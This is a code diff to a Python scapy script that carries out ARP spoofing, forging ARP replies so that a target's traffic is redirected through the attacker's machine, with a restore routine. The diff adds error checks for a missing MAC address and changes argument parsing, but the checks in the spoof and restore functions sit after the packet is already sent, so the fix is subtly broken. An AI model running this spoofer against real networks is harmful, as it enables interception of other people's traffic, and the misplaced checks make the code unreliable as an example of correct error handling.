@@ -19,12 +19,18 @@ def get_mac(ip):
     arp_request_broadcast = broadcast/arp_request
     answered_list, unanswered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)
 
+    if len(answered_list) == 0:
+        return None
+
     return answered_list[0][1].hwsrc
 
 def spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
+    if target_mac is None:
+        print(f"[-] could not get MAC for {target_ip}")
+        return
 
 def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
@@ -32,8 +38,13 @@ def restore(destination_ip, source_ip):
     packet = scapy.ARP(op=2, pdst=destination_ip,
                        hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
     scapy.send(packet, count=4, verbose=False)
+    if destination_mac is None:
+        print(f"[-] could not get MAC for {destination_ip}")
+        return
 
-target_1, target_2 = get_arguments()
+options = get_arguments()
+target_1 = options.first_ip
+target_2 = options.second_ip
 
 packets_count = 0
 try:
